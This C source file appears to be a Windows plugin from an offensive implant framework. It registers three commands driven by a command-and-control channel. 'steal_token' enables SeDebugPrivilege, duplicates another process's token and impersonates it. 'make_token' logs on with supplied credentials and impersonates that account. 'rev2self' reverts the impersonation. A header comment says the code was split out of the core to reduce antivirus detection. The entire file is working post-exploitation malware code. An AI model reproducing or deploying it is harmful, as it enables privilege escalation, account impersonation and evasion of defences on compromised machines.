/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Token tab plugin — steal_token, make_token, rev2self.
 *
 * Moved out of the core to reduce AV detection surface.
 * Loaded on demand as a tab DLL.
 *
 * NOTE: token_getuid remains in the core (getuid.h) since it is
 * a benign identity check used by the always-loaded getuid command.
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <string.h>
#include <stdio.h>

#include <pwny/c2.h>
#include <pwny/log.h>

#define TOKEN_BASE 21

#define TOKEN_STEAL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TOKEN_BASE, \
                       API_CALL)
#define TOKEN_REV2SELF \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TOKEN_BASE, \
                       API_CALL + 1)
#define TOKEN_MAKE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TOKEN_BASE, \
                       API_CALL + 3)

#define TLV_TYPE_TOKEN_USER   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TOKEN_BASE, API_TYPE)
#define TLV_TYPE_TOKEN_DOMAIN TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TOKEN_BASE, API_TYPE + 1)
#define TLV_TYPE_TOKEN_PASS   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TOKEN_BASE, API_TYPE + 2)

static HANDLE stolen_token = NULL;

/* Local wchar_to_utf8 — tab_dll does not include misc.c */
static char *local_wchar_to_utf8(const wchar_t *in)
{
    char *out;
    int len;

    if (in == NULL)
    {
        return NULL;
    }

    len = WideCharToMultiByte(CP_UTF8, 0, in, -1, NULL, 0, NULL, NULL);
    if (len <= 0)
    {
        return NULL;
    }

    out = calloc(len, sizeof(char));
    if (out == NULL)
    {
        return NULL;
    }

    if (WideCharToMultiByte(CP_UTF8, 0, in, -1, out, len, NULL, FALSE) == 0)
    {
        free(out);
        return NULL;
    }

    return out;
}

static int token_enable_privilege(LPCSTR priv)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return -1;
    }

    if (!LookupPrivilegeValueA(NULL, priv, &luid))
    {
        CloseHandle(hToken);
        return -1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    return (GetLastError() == ERROR_NOT_ALL_ASSIGNED) ? -1 : 0;
}

static int token_get_username(HANDLE hToken, char *buf, size_t buf_size)
{
    BYTE tokenInfo[4096];
    DWORD dwSize;
    WCHAR cbUser[512], cbDomain[512];
    DWORD dwUserSize = sizeof(cbUser) / sizeof(WCHAR);
    DWORD dwDomainSize = sizeof(cbDomain) / sizeof(WCHAR);
    DWORD dwSidType = 0;
    char *domain;
    char *user;

    if (!GetTokenInformation(hToken, TokenUser, tokenInfo,
                             sizeof(tokenInfo), &dwSize))
    {
        return -1;
    }

    if (!LookupAccountSidW(NULL, ((TOKEN_USER *)tokenInfo)->User.Sid,
                           cbUser, &dwUserSize, cbDomain,
                           &dwDomainSize, (PSID_NAME_USE)&dwSidType))
    {
        return -1;
    }

    domain = local_wchar_to_utf8(cbDomain);
    user = local_wchar_to_utf8(cbUser);

    if (domain == NULL || user == NULL)
    {
        free(domain);
        free(user);
        return -1;
    }

    _snprintf(buf, buf_size, "%s\\%s", domain, user);
    buf[buf_size - 1] = '\0';

    free(domain);
    free(user);

    return 0;
}

static tlv_pkt_t *token_steal(c2_t *c2)
{
    int pid;
    HANDLE hProcess;
    HANDLE hToken;
    HANDLE hDupToken;
    tlv_pkt_t *result;
    char username[1024];

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PID, &pid) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    token_enable_privilege("SeDebugPrivilege");

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (hProcess == NULL)
    {
        log_debug("* OpenProcess(%d) failed (%lu)\n", pid, GetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!OpenProcessToken(hProcess,
                          TOKEN_DUPLICATE | TOKEN_QUERY |
                          TOKEN_IMPERSONATE, &hToken))
    {
        log_debug("* OpenProcessToken failed (%lu)\n", GetLastError());
        CloseHandle(hProcess);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    CloseHandle(hProcess);

    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation,
                          &hDupToken))
    {
        log_debug("* DuplicateTokenEx failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDupToken))
    {
        log_debug("* ImpersonateLoggedOnUser failed (%lu)\n", GetLastError());
        CloseHandle(hDupToken);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (stolen_token != NULL)
    {
        CloseHandle(stolen_token);
    }
    stolen_token = hDupToken;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    if (token_get_username(hDupToken, username, sizeof(username)) == 0)
    {
        tlv_pkt_add_string(result, TLV_TYPE_TOKEN_USER, username);
    }

    return result;
}

static tlv_pkt_t *token_rev2self(c2_t *c2)
{
    RevertToSelf();

    if (stolen_token != NULL)
    {
        CloseHandle(stolen_token);
        stolen_token = NULL;
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *token_make(c2_t *c2)
{
    char domain[256];
    char user[256];
    char password[256];
    HANDLE hToken;
    HANDLE hDupToken;
    tlv_pkt_t *result;
    char username[1024];

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TOKEN_DOMAIN, domain) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TOKEN_USER, user) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TOKEN_PASS, password) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!LogonUserA(user, domain, password,
                    LOGON32_LOGON_NEW_CREDENTIALS,
                    LOGON32_PROVIDER_WINNT50,
                    &hToken))
    {
        log_debug("* token_make: LogonUser failed (%lu)\n", GetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation,
                          &hDupToken))
    {
        log_debug("* token_make: DuplicateTokenEx failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDupToken))
    {
        log_debug("* token_make: ImpersonateLoggedOnUser failed (%lu)\n",
                  GetLastError());
        CloseHandle(hDupToken);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (stolen_token != NULL)
    {
        CloseHandle(stolen_token);
    }
    stolen_token = hDupToken;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    if (token_get_username(hDupToken, username, sizeof(username)) == 0)
    {
        tlv_pkt_add_string(result, TLV_TYPE_TOKEN_USER, username);
    }

    return result;
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, TOKEN_STEAL, (api_t)token_steal);
    api_call_register(api_calls, TOKEN_REV2SELF, (api_t)token_rev2self);
    api_call_register(api_calls, TOKEN_MAKE, (api_t)token_make);
}

#endif
